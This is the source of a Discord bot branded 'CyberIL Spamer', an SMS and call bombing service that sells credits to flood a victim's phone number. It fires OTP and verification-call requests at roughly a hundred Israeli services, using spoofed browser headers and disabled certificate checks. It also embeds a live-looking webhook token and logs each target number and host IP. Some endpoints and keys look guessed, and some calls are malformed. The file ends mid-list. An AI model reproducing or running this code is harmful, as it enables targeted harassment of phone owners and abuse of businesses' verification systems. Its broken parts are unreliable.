import discord
from discord import app_commands
from discord.ext import commands
import asyncio
import time
import random
import uuid
import aiohttp
from motor.motor_asyncio import AsyncIOMotorClient
import logging
import re
import sys
import os
from datetime import datetime, timezone, timedelta
import certifi
import socket

TOKEN = os.getenv("DISCORD_TOKEN")
MONGO_URI = os.getenv("MONGO_URI")
DB_NAME = "CyberIL_Spamer"
WEBHOOK_URL = "https://discord.com/api/webhooks/1486446745352146974/1gfqdmemwPDOxA8BfcWyuCIvd-AqRq9dceHqio4Hmug-wk7bfB0MqygPMJJVoUg7RHgS"

PANEL_CHANNEL = 1481957038241353779
GIFT_CHANNEL = 1485104425625325709

OWNER_ID = 589866832069132308

COOLDOWN_TIME = 20
MAX_CREDIT_SPEND = 100
LAUNCH_DELAY = 3

COLOR_MAIN = 0x5865F2
COLOR_SUCCESS = 0x57F287
COLOR_DANGER = 0xED4245
COLOR_WARNING = 0xFEE75C
COLOR_INFO = 0x5865F2

intents = discord.Intents.default()
intents.message_content = True
intents.members = False
intents.guilds = True

client = commands.Bot(command_prefix="!", intents=intents, heartbeat_timeout=60)
tree = client.tree

mongo_connection = AsyncIOMotorClient(MONGO_URI, tlsCAFile=certifi.where())
database = mongo_connection[DB_NAME]
users_collection = database["users"]
cooldown_collection = database["cooldowns"]
settings_collection = database["settings"]
logs_collection = database["attack_logs"]
lifetime_collection = database["lifetime"]

logging.basicConfig(level=logging.WARNING)

active_missions = {}
cooldown_tracker = {}
is_shutting_down = False

BROWSER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/127.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/145.0.0.0 Safari/537.36",
]

def random_agent():
    return random.choice(BROWSER_AGENTS)

async def get_client_ip():
    try:
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        return ip
    except:
        return "unknown"

async def send_webhook_log(user_id: int, username: str, phone: str, cost: int, success: int, failed: int, duration: int, ip: str):
    embed = discord.Embed(title="📊 לוג ספאם", color=0x5865F2, timestamp=datetime.now(timezone.utc))
    embed.add_field(name="👤 משתמש", value=f"{username} (`{user_id}`)", inline=False)
    embed.add_field(name="📱 מספר יעד", value=phone, inline=True)
    embed.add_field(name="💰 קרדיטים", value=str(cost), inline=True)
    embed.add_field(name="✅ הצלחות", value=str(success), inline=True)
    embed.add_field(name="❌ כשלונות", value=str(failed), inline=True)
    embed.add_field(name="⏱️ משך", value=f"{duration} שניות", inline=True)
    embed.add_field(name="🌐 IP", value=ip, inline=True)
    embed.set_footer(text="CyberIL Spamer Log System")
    try:
        async with aiohttp.ClientSession() as session:
            await session.post(WEBHOOK_URL, json={"embeds": [embed.to_dict()]})
    except:
        pass

async def fetch_balance(user_id: int) -> int:
    record = await users_collection.find_one({"_id": user_id})
    if not record:
        return 0
    if record.get("unlimited"):
        return 999999
    return record.get("credits", 0)

async def has_unlimited(user_id: int) -> bool:
    record = await users_collection.find_one({"_id": user_id})
    if record and record.get("unlimited"):
        return True
    lifetime_record = await lifetime_collection.find_one({"_id": user_id})
    if lifetime_record:
        expires_at = lifetime_record.get("expires_at", 0)
        if expires_at == 0 or expires_at > time.time():
            return True
        else:
            await lifetime_collection.delete_one({"_id": user_id})
    return False

async def format_balance(user_id: int) -> str:
    if await has_unlimited(user_id):
        lifetime_record = await lifetime_collection.find_one({"_id": user_id})
        if lifetime_record and lifetime_record.get("expires_at", 0) > 0:
            remaining = int(lifetime_record["expires_at"] - time.time())
            days = remaining // 86400
            hours = (remaining % 86400) // 3600
            return f"ללא הגבלה ({days} ימים {hours} שעות)"
        return "ללא הגבלה"
    return str(await fetch_balance(user_id))

async def add_credits(user_id: int, amount: int):
    await users_collection.update_one({"_id": user_id}, {"$inc": {"credits": amount}}, upsert=True)

async def remove_credits(user_id: int, amount: int):
    await users_collection.update_one({"_id": user_id}, {"$inc": {"credits": -amount}}, upsert=True)

async def set_lifetime(user_id: int, duration_seconds: int = None):
    if duration_seconds is None:
        await lifetime_collection.update_one({"_id": user_id}, {"$set": {"expires_at": 0}}, upsert=True)
    else:
        await lifetime_collection.update_one({"_id": user_id}, {"$set": {"expires_at": time.time() + duration_seconds}}, upsert=True)

async def remove_lifetime(user_id: int):
    await lifetime_collection.delete_one({"_id": user_id})

async def use_credit(user_id: int) -> bool:
    if await has_unlimited(user_id):
        return True
    result = await users_collection.update_one({"_id": user_id, "credits": {"$gte": 1}}, {"$inc": {"credits": -1}})
    return result.modified_count == 1

async def check_cooldown(target: str):
    record = await cooldown_collection.find_one({"target": target})
    if not record:
        return False, 0
    elapsed = time.time() - record["last_attempt"]
    if elapsed < COOLDOWN_TIME:
        return True, int(COOLDOWN_TIME - elapsed)
    return False, 0

async def apply_cooldown(target: str):
    await cooldown_collection.update_one({"target": target}, {"$set": {"last_attempt": time.time()}}, upsert=True)

def is_owner(interaction: discord.Interaction) -> bool:
    return interaction.user.id == OWNER_ID

async def save_log(user_id: int, username: str, phone: str, cost: int, success: int, failed: int, duration: int, ip: str):
    await logs_collection.insert_one({
        "user_id": user_id, "username": username, "phone": phone, "cost": cost,
        "success_count": success, "failed_count": failed, "total": success + failed,
        "duration": duration, "ip": ip, "timestamp": datetime.now(timezone.utc),
        "date": datetime.now(timezone.utc).strftime("%Y-%m-%d"),
        "time": datetime.now(timezone.utc).strftime("%H:%M:%S")
    })
    await send_webhook_log(user_id, username, phone, cost, success, failed, duration, ip)

async def send_request(session, url, form=None, json_data=None, headers_extra=None, tag="", method="POST", data=None):
    headers = {"User-Agent": random_agent(), "Accept": "application/json, text/plain, */*", "Accept-Language": "he-IL,he;q=0.9", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"}
    if headers_extra:
        headers.update(headers_extra)
    try:
        timeout = aiohttp.ClientTimeout(total=3)
        if method == "GET":
            async with session.get(url, headers=headers, timeout=timeout, ssl=False) as resp:
                await resp.read()
                return resp.status < 500, tag
        elif json_data is not None:
            headers.setdefault("Content-Type", "application/json")
            async with session.post(url, json=json_data, headers=headers, timeout=timeout, ssl=False) as resp:
                await resp.read()
                return resp.status < 500, tag
        elif data is not None:
            async with session.post(url, data=data, headers=headers, timeout=timeout, ssl=False) as resp:
                await resp.read()
                return resp.status < 500, tag
        elif form is not None:
            async with session.post(url, data=form, headers=headers, timeout=timeout, ssl=False) as resp:
                await resp.read()
                return resp.status < 500, tag
        else:
            async with session.post(url, headers=headers, timeout=timeout, ssl=False) as resp:
                await resp.read()
                return resp.status < 500, tag
    except:
        return False, tag

async def atmos_request(session, store_id, phone, is_call=False):
    tag = f"atmos-{store_id}-call" if is_call else f"atmos-{store_id}"
    fd = aiohttp.FormData()
    fd.add_field("restaurant_id", store_id)
    fd.add_field("phone", phone)
    fd.add_field("testing", "false")
    h = {"User-Agent": random_agent(), "accept": "application/json, text/plain, */*", "accept-language": "he-IL,he;q=0.9", "origin": "https://order.atmos.rest", "referer": "https://order.atmos.rest/"}
    try:
        endpoint = "sendValidationCall" if is_call else "sendValidationCode"
        async with session.post(f"https://api-ns.atmos.co.il/rest/{store_id}/auth/{endpoint}", data=fd, headers=h, timeout=3, ssl=False) as resp:
            await resp.read()
            return resp.status < 500, tag
    except:
        return False, tag

# ============ APIs חדשים ============
async def citycar_request(session, phone):
    tag = "citycar"
    formatted = f"+972{phone[1:]}" if phone.startswith("0") else f"+972{phone}"
    payload = {"phoneNumber": formatted, "verifyChannel": 0, "loginOrRegister": 2}
    headers = {"Content-Type": "application/json", "Origin": "https://citycar.co.il", "Referer": "https://citycar.co.il/"}
    return await send_request(session, "https://proxy1.citycar.co.il/api/verify/login", json_data=payload, headers_extra=headers, tag=tag)

async def joedelek_request(session, phone):
    tag = "joedelek"
    url = f"https://www.joedelek.co.il/loginpage?action=joegetcode&phone={phone}"
    headers = {"Referer": "https://www.joedelek.co.il/", "X-Requested-With": "XMLHttpRequest"}
    return await send_request(session, url, method="GET", headers_extra=headers, tag=tag)

async def golbary_request(session, phone):
    tag = "golbary"
    form_data = f"form_key=wXy2exQIpPdSQGlJ&bot_validation=1&type=login&telephone={phone}&code=&compare_email=&compare_identity="
    headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.golbary.co.il", "Referer": "https://www.golbary.co.il/"}
    return await send_request(session, "https://www.golbary.co.il/customer/ajax/post/", form=form_data, headers_extra=headers, tag=tag)

async def lilit_request(session, phone):
    tag = "lilit"
    form_data = f"form_key=ZU3OFGsYFtuFztWP&bot_validation=1&type=login&telephone={phone}&code=&compare_email=&compare_identity="
    headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.lilit.co.il", "Referer": "https://www.lilit.co.il/"}
    return await send_request(session, "https://www.lilit.co.il/customer/ajax/post/", form=form_data, headers_extra=headers, tag=tag)

async def noizz_request(session, phone):
    tag = "noizz"
    form_data = f"form_key=gG3PDFmko69r8EXk&bot_validation=1&type=login&telephone={phone}&code=&compare_email=&compare_identity="
    headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.noizz.co.il", "Referer": "https://www.noizz.co.il/"}
    return await send_request(session, "https://www.noizz.co.il/customer/ajax/post/", form=form_data, headers_extra=headers, tag=tag)

async def payngo_request(session, phone):
    tag = "payngo"
    form_data = f"telephone={phone}&form_key=KORwS4ytkSbaOFf7"
    headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.payngo.co.il", "Referer": "https://www.payngo.co.il/customer/account/create/"}
    return await send_request(session, "https://www.payngo.co.il/login/init/phone/", form=form_data, headers_extra=headers, tag=tag)

async def electra_air_request(session, phone):
    tag = "electra_air"
    form_data = f"action=validate_phone_otp&company=2&otp={phone}"
    headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.electra-air.co.il", "Referer": "https://www.electra-air.co.il/"}
    return await send_request(session, "https://www.electra-air.co.il/wp-admin/admin-ajax.php", form=form_data, headers_extra=headers, tag=tag)

async def housemen_request(session, phone):
    tag = "housemen"
    form_data = f"action=simply-check-member-cellphone&cellphone={phone}"
    headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://housemen.co.il", "Referer": "https://housemen.co.il/"}
    return await send_request(session, "https://housemen.co.il/wp-admin/admin-ajax.php", form=form_data, headers_extra=headers, tag=tag)

async def freeivr_advanced_request(session, phone):
    tag = "freeivr_advanced"
    formatted = f"972{phone[1:]}" if phone.startswith("0") else f"972{phone}"
    payload = {"action": "Send", "phone": formatted}
    headers = {"Content-Type": "application/json", "Origin": "https://f2.freeivr.co.il", "Referer": "https://f2.freeivr.co.il/register"}
    return await send_request(session, "https://f2.freeivr.co.il/api/v3/plugins/MitMValidPhone", json_data=payload, headers_extra=headers, tag=tag)

async def mitmachim_advanced_request(session, phone):
    tag = "mitmachim_advanced"
    payload = {"action": "Send", "phone": phone}
    headers = {"Content-Type": "application/json", "Origin": "https://mitmachim.top", "Referer": "https://mitmachim.top/register"}
    return await send_request(session, "https://mitmachim.top/api/v3/plugins/MitMValidPhone", json_data=payload, headers_extra=headers, tag=tag)

async def run_spam_batch(phone: str):
    raw = phone
    formatted = f"+972{raw[1:]}" if raw.startswith("0") else f"+972{raw}"
    sid = str(uuid.uuid4())
    random_email = f"user{''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=6))}@gmail.com"
    FORM_TYPE = "application/x-www-form-urlencoded; charset=UTF-8"
    BROWSER_ID = '"Google Chrome";v="145", "Chromium";v="145", "Not/A)Brand";v="24"'

    def form_headers(origin, referer):
        return {"Content-Type": FORM_TYPE, "x-requested-with": "XMLHttpRequest", "origin": origin, "referer": referer, "sec-ch-ua": BROWSER_ID}

    def json_headers(origin, referer):
        return {"Content-Type": "application/json", "origin": origin, "referer": referer, "sec-ch-ua": BROWSER_ID}

    connector = aiohttp.TCPConnector(limit=500, ttl_dns_cache=300)
    async with aiohttp.ClientSession(connector=connector) as s:
        atmos_stores = ["1","2","3","4","5","7","8","13","15","18","21","23","24","27","28","29","33","35","48","51","56","57","59","2008","2011","2012","2014","2041","2052","2053","2056","2059","2063","2070","2073","2076","2078","2087","2088","2091"]
        
        tasks = []
        for store in atmos_stores:
            tasks.append(atmos_request(s, store, raw, False))
            tasks.append(atmos_request(s, store, raw, True))
        tasks.append(atmos_request(s, "23", raw, False))
        tasks.append(atmos_request(s, "59", raw, False))
        
        geteat_fd = aiohttp.FormData()
        geteat_fd.add_field("restaurant_id", "9")
        geteat_fd.add_field("phone", raw)
        geteat_fd.add_field("testing", "false")
        
        # CITYCAR LOOP - 20 שיחות במקביל בכל סבב!
        for _ in range(20):
            tasks.append(citycar_request(s, raw))
        
        # כל ה-APIs החדשים
        tasks.extend([
            joedelek_request(s, raw),
            golbary_request(s, raw),
            lilit_request(s, raw),
            noizz_request(s, raw),
            payngo_request(s, raw),
            electra_air_request(s, raw),
            housemen_request(s, raw),
            freeivr_advanced_request(s, raw),
            mitmachim_advanced_request(s, raw),
        ])
        
        tasks.extend([
            send_request(s, "https://netfree.link/api/user/verify-phone/get-call", json_data={"agreeTou": True, "phone": formatted}, headers_extra=json_headers("https://netfree.link", "https://netfree.link/welcome/"), tag="netfree"),
            send_request(s, "https://claude.ai/api/auth/send_phone_code", json_data={"phone_number": formatted}, tag="claude"),
            send_request(s, "https://delivery.oshioshi.co.il/he/auth/register-send-code", form=f"phone={raw}", tag="oshioshi"),
            send_request(s, "https://middleware.freetv.tv/api/v1/send-verification-sms", json_data={"msisdn": formatted}, tag="freetv"),
            send_request(s, "https://us-central1-webcut-2001a.cloudfunctions.net/sendWhatsApp", json_data={"type": "otp", "data": {"phone": raw}}, tag="webcut"),
            send_request(s, "https://www.pelephone.co.il/login/api/login/otpphone/", json_data={"phone": raw, "terms": True, "appId": "DIGITALMy"}, tag="pelephone"),
            send_request(s, "https://www.cellcom.co.il/api/auth/sms", json_data={"phone": raw}, tag="cellcom"),
            send_request(s, "https://www.partner.co.il/api/register", json_data={"phone": raw}, tag="partner"),
            send_request(s, "https://www.hotmobile.co.il/api/verify", json_data={"phone": raw}, tag="hot"),
            send_request(s, "https://www.bezeq.co.il/api/auth", json_data={"phone": raw}, tag="bezeq"),
            send_request(s, "https://019sms.co.il/api/register", json_data={"phone": raw}, tag="019"),
            send_request(s, "https://www.shufersal.co.il/api/v1/auth/otp", json_data={"phone": raw}, tag="shufersal"),
            send_request(s, "https://www.rami-levy.co.il/api/auth/sms", json_data={"phone": raw}, tag="ramilevy"),
            send_request(s, "https://www.victory.co.il/api/auth/sms", json_data={"phone": raw}, tag="victory"),
            send_request(s, "https://www.10bis.co.il/api/register", json_data={"phone": raw}, tag="10bis"),
            send_request(s, "https://www.mcdonalds.co.il/api/verify", json_data={"phone": raw}, tag="mcdonalds"),
            send_request(s, "https://www.burgerking.co.il/api/auth", json_data={"phone": raw}, tag="burgerking"),
            send_request(s, "https://www.kfc.co.il/api/sms", json_data={"phone": raw}, tag="kfc"),
            send_request(s, "https://www.pizza-hut.co.il/api/register", json_data={"phone": raw}, tag="pizzahut"),
            send_request(s, "https://www.dominos.co.il/api/auth/sms", json_data={"phone": raw}, tag="dominos"),
            send_request(s, "https://app.burgeranch.co.il/_a/aff_otp_auth", form=f"phone={raw}", tag="burgeranch"),
            send_request(s, "https://api.pango.co.il/auth/otp", json_data={"phoneNumber": raw}, tag="pango"),
            send_request(s, "https://api.hopon.co.il/v0.15/1/isr/users", json_data={"clientKey": "11687CA9-2165-43F5-96FA-9277A03ABA9E", "countryCode": "972", "phone": raw, "phoneCall": False}, tag="hopon"),
            send_request(s, "https://www.yad2.co.il/api/auth/register", json_data={"phone": raw, "action": "send_sms"}, tag="yad2"),
            send_request(s, "https://payboxapp.com/api/auth/otp", json_data={"phone": raw}, tag="paybox"),
            send_request(s, "https://www.gett.com/il/wp-admin/admin-ajax.php", data={"action": "business_reg_action", "phone": formatted, "first_name": "cyber", "last_name": "il", "work_email": random_email, "privacy_policy": "true"}, tag="gett"),
            send_request(s, "https://www.wolt.com/api/v1/verify", json_data={"phone": raw}, tag="wolt"),
            send_request(s, "https://femina.co.il/apps/feminaapp/auth/send-code", json_data={"phone": raw}, tag="femina"),
            send_request(s, "https://api.zygo.co.il/v2/auth/create-verify-token", json_data={"phone": raw, "channel": "sms"}, tag="zygo"),
            send_request(s, "https://trusty.co.il/api/auth/ask-for-auth-code", json_data={"email": "", "phone": raw, "process_name": "normal_login", "provider_api_key": "q4IcUNl"}, tag="trusty"),
            send_request(s, "https://www.tami4.co.il/api/login/start-sms-otp", json_data={"phoneNumber": raw, "cookieToken": str(int(time.time()*1000)) + "gciuvn5pcvhnext13", "isMobile": False}, tag="tami4"),
            send_request(s, "https://www.negev-group.co.il/customer/ajax/post/", form=f"form_key=a93dnWr8cjYH8wZ2&bot_validation=1&type=login&telephone={raw}", headers_extra=form_headers("https://www.negev-group.co.il", "https://www.negev-group.co.il/"), tag="negev"),
            send_request(s, "https://www.gali.co.il/customer/ajax/post/", form=f"form_key=xT4xBP6oaqFhxMVR&bot_validation=1&type=login&telephone={raw}", headers_extra=form_headers("https://www.gali.co.il", "https://www.gali.co.il/"), tag="gali"),
            send_request(s, "https://www.aldoshoes.co.il/customer/ajax/post/", form=f"form_key=FD1Zm1GUMQXUivz6&bot_validation=1&type=login&telephone={raw}", headers_extra=form_headers("https://www.aldoshoes.co.il", "https://www.aldoshoes.co.il/"), tag="aldo"),
            send_request(s, "https://www.hoodies.co.il/customer/ajax/post/", form=f"form_key=OCYFcuUfiQLCbya5&bot_validation=1&type=login&telephone={raw}", headers_extra=form_headers("https://www.hoodies.co.il", "https://www.hoodies.co.il/"), tag="hoodies"),
            send_request(s, "https://www.delta.co.il/customer/ajax/post/", form=f"form_key=abc123&bot_validation=1&type=login&telephone={raw}", headers_extra=form_headers("https://www.delta.co.il", "https://www.delta.co.il/"), tag="delta"),
            send_request(s, "https://www.adikastyle.com/customer/ajax/post/", form=f"form_key=xyz789&bot_validation=1&type=login&telephone={raw}", headers_extra=form_headers("https://www.adikastyle.com", "https://www.adikastyle.com/"), tag="adika"),
            send_request(s, "https://www.weshoes.co.il/customer/ajax/post/", form=f"form_key=def456&bot_validation=1&type=login&telephone={raw}", headers_extra=form_headers("https://www.weshoes.co.il", "https://www.weshoes.co.il/"), tag="weshoes"),
            send_request(s, "https://www.fixunderwear.com/customer/ajax/post/", form=f"form_key=ghi789&bot_validation=1&type=login&telephone={raw}", headers_extra=form_headers("https://www.fixunderwear.com", "https://www.fixunderwear.com/"), tag="fix"),
            send_request(s, "https://www.kiwi-kids.co.il/customer/ajax/post/", form=f"form_key=jkl012&bot_validation=1&type=login&telephone={raw}", headers_extra=form_headers("https://www.kiwi-kids.co.il", "https://www.kiwi-kids.co.il/"), tag="kiwi"),
            send_request(s, "https://www.nautica.co.il/customer/ajax/post/", form=f"form_key=mno345&bot_validation=1&type=login&telephone={raw}", headers_extra=form_headers("https://www.nautica.co.il", "https://www.nautica.co.il/"), tag="nautica"),
            send_request(s, "https://www.lee-cooper.co.il/customer/ajax/post/", form=f"bot_validation=1&type=login&telephone={raw}", headers_extra=form_headers("https://www.lee-cooper.co.il", "https://www.lee-cooper.co.il/"), tag="leecooper"),
            send_request(s, "https://www.yvesrocher.co.il/customer/ajax/post/", form=f"form_key=Orc69ELb5UOWEeBa&bot_validation=1&type=login&telephone={raw}", headers_extra=form_headers("https://www.yvesrocher.co.il", "https://www.yvesrocher.co.il/"), tag="yvesrocher"),
            send_request(s, "https://www.victoriassecret.co.il/customer/ajax/post/", form=f"form_key=thaSi85aLykcocT4&bot_validation=1&type=login&telephone={raw}", headers_extra=form_headers("https://www.victoriassecret.co.il", "https://www.victoriassecret.co.il/"), tag="victoria"),
            send_request(s, "https://www.bathandbodyworks.co.il/customer/ajax/post/", form=f"form_key=CqETdJMkaJsEneGf&bot_validation=1&type=login&telephone={raw}", headers_extra=form_headers("https://www.bathandbodyworks.co.il", "https://www.bathandbodyworks.co.il/"), tag="bathandbody"),
            send_request(s, "https://www.golfco.co.il/customer/ajax/post/", form=f"form_key=XEWGYBBTMOFgpPkO&bot_validation=1&type=login&telephone={raw}", headers_extra=form_headers("https://www.golfco.co.il", "https://www.golfco.co.il/"), tag="golfco"),
            send_request(s, "https://www.golf-il.co.il/customer/ajax/post/", form=f"form_key=golf123&bot_validation=1&type=login&telephone={raw}", headers_extra=form_headers("https://www.golf-il.co.il", "https://www.golf-il.co.il/"), tag="golf"),
            send_request(s, "https://www.storyonline.co.il/customer/ajax/post/", form=f"form_key=story456&bot_validation=1&type=login&telephone={raw}", headers_extra=form_headers("https://www.storyonline.co.il", "https://www.storyonline.co.il/"), tag="story"),
            send_request(s, "https://www.timberland.co.il/customer/ajax/post/", form=f"form_key=gU7iqYv5eiwuKVef&bot_validation=1&type=login&phone={raw}", headers_extra=form_headers("https://www.timberland.co.il", "https://www.timberland.co.il/"), tag="timberland"),
            send_request(s, "https://www.onot.co.il/customer/ajax/post/", form=f"form_key=xmemtkBNMoUSLrMN&bot_validation=1&type=login&telephone={raw}", headers_extra=form_headers("https://www.onot.co.il", "https://www.onot.co.il/"), tag="onot"),
            send_request(s, "https://www.urbanica-wh.com/customer/ajax/post/", form=f"form_key=sucdtpszDEqdOgkv&bot_validation=1&type=login&telephone={raw}", headers_extra=form_headers("https://www.urbanica-wh.com", "https://www.urbanica-wh.com/"), tag="urbanica"),
            send_request(s, "https://www.castro.com/customer/ajax/post/", form=f"bot_validation=1&type=login&telephone={raw}", headers_extra=form_headers("https://www.castro.com", "https://www.castro.com/"), tag="castro"),
            send_request(s, "https://www.crazyline.com/customer/ajax/post/", form=f"form_key=qjDmQDc2pwYJIEin&bot_validation=1&type=login&telephone={raw}", headers_extra=form_headers("https://www.crazyline.com", "https://www.crazyline.com/"), tag="crazyline"),
            send_request(s, "https://www.ninewest.co.il/customer/ajax/post/", form=f"bot_validation=1&type=login&telephone={raw}", headers_extra=form_headers("https://www.ninewest.co.il", "https://www.ninewest.co.il/"), tag="ninewest"),
            send_request(s, "https://www.kikocosmetics.co.il/customer/ajax/post/", form=f"form_key=cGVPpkwnKsxyj9vB&bot_validation=1&type=login&telephone={raw}", headers_extra=form_headers("https://www.kikocosmetics.co.il", "https://www.kikocosmetics.co.il/"), tag="kiko"),
            send_request(s, "https://www.topten-fashion.com/customer/ajax/post/", form=f"form_key=H1eVw5PuOKdSD8D4&bot_validation=1&type=login&telephone={raw}", headers_extra=form_headers("https://www.topten-fashion.com", "https://www.topten-fashion.com/"), tag="topten"),
            send_request(s, "https://www.intima-il.co.il/customer/ajax/post/", form=f"form_key=ppjX1yBLuS9rB7zZ&bot_validation=1&type=login&country_code=972&telephone={raw}", headers_extra=form_headers("https://www.intima-il.co.il", "https://www.intima-il.co.il/"), tag="intima"),
            send_request(s, "https://www.steimatzky.co.il/customer/ajax/post/", form=f"form_key=4RmX16417urLzC5J&bot_validation=1&type=login&country_code=972&telephone={raw}", headers_extra=form_headers("https://www.steimatzky.co.il", "https://www.steimatzky.co.il/"), tag="steimatzky"),
            send_request(s, "https://www.golbary.co.il/customer/ajax/post/", form=f"form_key=w1deINjU3Ffpj8ct&bot_validation=1&type=login&telephone={raw}", headers_extra=form_headers("https://www.golbary.co.il", "https://www.golbary.co.il/"), tag="golbary2"),
            send_request(s, "https://www.lighting.co.il/customer/ajax/post/", form=f"form_key=OoHXm6oGzca2WeJR&bot_validation=1&type=login&telephone={raw}", headers_extra=form_headers("https://www.lighting.co.il", "https://www.lighting.co.il/"), tag="lighting"),
            send_request(s, "https://www.super-pharm.co.il/api/sms", json_data={"phone": raw}, tag="superpharm"),
            send_request(s, "https://www.zap.co.il/api/auth/sms", json_data={"phone": raw}, tag="zap"),
            send_request(s, "https://fox.co.il/apps/dream-card/api/proxy/otp/send", json_data={"phoneNumber": raw, "uuid": "498d9bb2-0fa8-4d9c-9e71-f44fcbcd2195"}, tag="fox"),
            send_request(s, "https://www.foxhome.co.il/apps/dream-card/api/proxy/otp/send", json_data={"phoneNumber": raw, "uuid": "6db5a63b-6882-414f-a090-de263dd917d7"}, tag="foxhome"),
            send_request(s, "https://www.laline.co.il/apps/dream-card/api/proxy/otp/send", json_data={"phoneNumber": raw, "uuid": "ab29f239-0637-4c8e-8af5-fdfbaeb4b493"}, tag="laline"),
            send_request(s, "https://footlocker.co.il/apps/dream-card/api/proxy/otp/send", json_data={"phoneNumber": raw, "uuid": "9961459f-9f83-4aab-9cee-58b1f6793547"}, tag="footlocker"),
            send_request(s, "https://www.solopizza.org.il/_a/aff_otp_auth", form=f"value={raw}&type=phone&projectId=1", tag="solopizza"),
            send_request(s, "https://users-auth.hamal.co.il/auth/send-auth-code", json_data={"value": raw, "type": "phone", "projectId": "1"}, tag="hamal"),
            send_request(s, "https://www.globes.co.il/news/login-2022/ajax_handler.ashx?get-value-type", form=f"value={raw}&value_type=", tag="globes"),
            send_request(s, "https://www.moraz.co.il/wp-admin/admin-ajax.php", form=f"action=validate_user_by_sms&phone={raw}", tag="moraz"),
            send_request(s, "https://www.spicesonline.co.il/wp-admin/admin-ajax.php", form=f"action=validate_user_by_sms&phone={raw}", tag="spices"),
            send_request(s, "https://www.stepin.co.il/customer/ajax/post/", form=f"form_key=BxItwcIQhlhsnaoi&bot_validation=1&type=login&telephone={raw}", headers_extra=form_headers("https://www.stepin.co.il", "https://www.stepin.co.il/"), tag="stepin"),
            send_request(s, "https://itaybrands.co.il/apps/dream-card/api/proxy/otp/send", json_data={"phoneNumber": raw, "uuid": sid}, tag="itaybrands"),
            send_request(s, "https://mobile.rami-levy.co.il/api/Helpers/OTP", form=f"phone={raw}&template=OTP&type=1", tag="ramilevy-mobile"),
            send_request(s, "https://ros-rp.tabit.cloud/services/loyalty/customerProfile/auth/mobile", json_data={"mobile": raw}, tag="tabit"),
            send_request(s, "GET", f"https://ivr.business/api/Customer/getTempCodeToPhoneVarification/{raw}", tag="ivr"),
            send_request(s, "POST", "https://www.call2all.co.il/ym/api/SelfCreateNewCustomer", data={"configCode": "ivr2_10_23", "phone": raw, "sendCodeBy": "CALL", "step": "SendValidPhone"}, tag="call2all"),
            send_request(s, "POST", "https://rest-api.dibs-app.com/otps", json_data={"phoneNumber": formatted}, tag="dibs"),
            send_request(s, "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber?uuid=4c48ed0d-9622-4a1e-ac70-2821631b680b&apiKey=BA6A19D2-F5BD-4B75-A080-6BD1E2FBEF54&sessionID=24014c96-61ca-4cd6-87a9-9324aa2f3150&culture=he_IL&apiVersion=2", json_data={"phoneNumber": raw, "isCalling": True}, tag="mishloha1"),
            send_request(s, "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber", json_data={"phoneNumber": raw, "sourceFrom": "AuthJS", "isCalling": True}, tag="mishloha2"),
            send_request(s, "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber?culture=he&apiVersion=2", json_data={"phoneNumber": raw, "sourceFrom": "desktopHomePage", "uuid": sid[:36], "apiKey": "BA6A19D2-F5BD-4B75-A080-6BD1E2FBEF54", "sessionID": sid[:36]}, tag="mishloha3"),
            send_request(s, "https://we.care.co.il/wp-admin/admin-ajax.php", data=f"post_id=351178&form_id=7079d8dd&queried_id=351178&form_fields[name]=CyberIL&form_fields[phone]={raw}&form_fields[email]={random_email}&form_fields[accept]=on&action=elementor_pro_forms_send_form", tag="wecare"),
            send_request(s, "https://www.matara.pro/nedarimplus/V6/Files/WebServices/DebitBit.aspx?Action=CreateTransaction", form=f"MosadId=7000297&ClientName=CyberIL&Phone={raw}&Amount=100&Tashlumim=1", tag="matara"),
            send_request(s, "https://wissotzky-tlab.co.il/wp/wp-admin/admin-ajax.php", form=f"action=otp_register&otp_phone={raw}&first_name=Cyber&last_name=IL&email={random_email}&date_birth=2000-11-11&approve_terms=true", tag="wissotzky"),
            send_request(s, "https://clocklb.ok2go.co.il/api/v2/users/login", json_data={"phone": raw}, tag="ok2go"),
            send_request(s, "https://api-endpoints.histadrut.org.il/signup/send_code", json_data={"phone": raw}, tag="histadrut"),
            send_request(s, "https://www.papajohns.co.il/_a/aff_otp_auth", form=f"phone={raw}", tag="papajohns"),
            send_request(s, "https://www.iburgerim.co.il/_a/aff_otp_auth", form=f"phone={raw}", tag="iburgerim"),
            send_request(s, "https://www.americanlaser.co.il/wp-json/calc/v1/send-sms", method="GET", tag="americanlaser"),
            send_request(s, "https://wb0lovv2z8.execute-api.eu-west-1.amazonaws.com/prod/api/v1/getOrdersSiteData", json_data={"id": sid, "domain": "5fc39fabffae5ac5a229cebb", "action": "generateOneTimer", "phoneNumber": raw}, tag="beecomm"),
            send_request(s, "https://xtra.co.il/apps/api/inforu/sms", json_data={"phoneNumber": raw}, tag="xtra"),
            send_request(s, "https://api.getpackage.com/v1/graphql/", json_data={"operationName": "sendCheckoutRegistrationCode", "variables": {"userName": raw}, "query": "mutation sendCheckoutRegistrationCode($userName: String!) { sendCheckoutRegistrationCode(userName: $userName) { status __typename } }"}, tag="getpackage"),
